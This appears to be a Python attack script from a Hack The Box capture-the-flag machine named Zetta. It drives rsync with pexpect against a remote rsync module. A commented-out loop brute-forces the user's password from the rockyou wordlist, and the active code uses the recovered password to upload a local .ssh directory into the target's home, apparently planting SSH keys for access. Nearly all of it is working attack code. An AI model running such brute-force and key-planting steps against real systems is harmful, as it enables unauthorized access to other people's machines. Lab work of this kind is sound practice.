#!/usr/bin/python
from subprocess import PIPE,Popen
import pexpect
import sys

cmd_read_home_roy = "rsync -6 -a rsync://roy@[dead:beef::250:56ff:feb9:b96a]:8730/home_roy /root/Scrivania/ctfsites/hackthebox/machines/actives/Zetta/secrets"
cmd_write_home_row = "rsync -6 -avzh /root/Scrivania/ctfsites/hackthebox/machines/actives/Zetta/secrets/.ssh rsync://roy@[dead:beef::250:56ff:feb9:b96a]:8730/home_roy"

c = 0
word = "computer"
#child = pexpect.spawn(cmd_read_home_roy)
#child.expect('\nPassword:')
#child.sendline(word)
#print(child.read())
'''with open('/usr/share/wordlists/rockyou.txt', 'r') as wordlist:
    passwords = 14344392
    for word in wordlist:
        word = word.rstrip("\n\r")
        child = pexpect.spawn(cmd_read_home_roy)
        child.expect('\nPassword:')
        child.sendline(word)
        c += 1
        status = child.read()
        per = float(c * 100 / passwords)
        sys.stdout.write("\rBruteforcing...Tested Password {0} ({1:.2f}% Done)".format(word, per))
        sys.stdout.flush()
        if(status.find('auth failed') == -1):
            print('Password found {}'.format(word))
            break
'''

child = pexpect.spawn(cmd_write_home_row)
child.expect('\nPassword:')
child.sendline(word)
print(child.read())
